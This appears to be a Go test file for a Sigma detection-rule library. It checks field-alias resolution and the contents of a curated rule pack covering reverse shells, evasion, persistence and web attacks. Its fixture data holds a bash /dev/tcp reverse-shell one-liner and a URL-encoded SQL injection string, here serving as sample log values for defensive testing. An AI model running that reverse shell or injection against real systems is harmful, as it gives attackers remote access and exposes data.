package sigma

import (
	"strings"
	"testing"
)

func TestFieldResolutionAliases(t *testing.T) {
	fields := map[string]string{
		"cmdline":          "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"uri":              "/api/v1/user?id=1%27%20UNION%20SELECT--",
		"method":           "POST",
		"src_ip":           "198.51.100.77",
		"dest_port":        "443",
		"message":          "Failed password for root from 198.51.100.77",
	}

	tests := []struct {
		target   string
		expected string
	}{
		{"CommandLine", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		{"RawLog", "Failed password for root from 198.51.100.77"},
		{"RequestURI", "/api/v1/user?id=1%27%20UNION%20SELECT--"},
		{"HTTPMethod", "POST"},
		{"SourceIP", "198.51.100.77"},
		{"DestinationPort", "443"},
	}

	for _, tt := range tests {
		val, ok := ResolveField(fields, tt.target)
		if !ok || val != tt.expected {
			t.Errorf("ResolveField(fields, %q) = %q (found=%v), expected %q", tt.target, val, ok, tt.expected)
		}
	}
}

func TestCuratedRulePackIntegrity(t *testing.T) {
	rules := GetCuratedRulePack()
	if len(rules) != 4 {
		t.Fatalf("Expected 4 curated rules in pack, got %d", len(rules))
	}

	expectedIDs := []string{
		"sigma-linux-revshell",
		"sigma-linux-evasion",
		"sigma-linux-persistence",
		"sigma-web-advanced",
	}

	for _, expectedID := range expectedIDs {
		var found bool
		for _, r := range rules {
			if strings.Contains(r, "id: "+expectedID) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Curated rule pack missing expected rule ID: %s", expectedID)
		}
	}
}

func TestCuratedCatalog(t *testing.T) {
	catalog := GetDefaultCatalog()
	if catalog.Count() != 4 {
		t.Fatalf("Expected 4 catalog entries, got %d", catalog.Count())
	}

	rule, err := catalog.GetRule("sigma-web-advanced")
	if err != nil {
		t.Fatalf("Failed to fetch sigma-web-advanced: %v", err)
	}
	if rule.MitreID != "T1190" {
		t.Errorf("Expected MitreID T1190, got %s", rule.MitreID)
	}
}
